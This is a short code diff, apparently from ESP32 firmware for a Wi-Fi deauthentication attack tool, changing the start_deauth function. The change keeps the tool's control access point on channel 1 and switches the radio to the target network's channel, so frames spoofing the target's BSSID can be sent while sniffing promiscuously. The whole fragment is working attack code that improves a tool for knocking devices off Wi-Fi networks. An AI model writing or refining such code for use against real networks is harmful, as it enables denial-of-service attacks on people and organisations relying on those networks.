@@ -158,12 +158,15 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   if (deauth_type == DEAUTH_TYPE_SINGLE) {
     DEBUG_PRINT("[MODE] Starting targeted deauth on: ");
     DEBUG_PRINTLN(WiFi.SSID(wifi_number));
-    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
+    // Keep softAP on fixed channel 1 to maintain web interface
+    WiFi.softAP(AP_SSID, AP_PASS, 1, true, 2);
     memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
     memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_filter(&filt);
     esp_wifi_set_promiscuous_rx_cb(&sniffer);
+    // Set STA interface to target channel for deauth
+    esp_wifi_set_channel(WiFi.channel(wifi_number), WIFI_SECOND_CHAN_NONE);
   } else {
     DEBUG_PRINTLN("[MODE] Starting broadcast deauth on all stations");
     WiFi.softAPdisconnect();
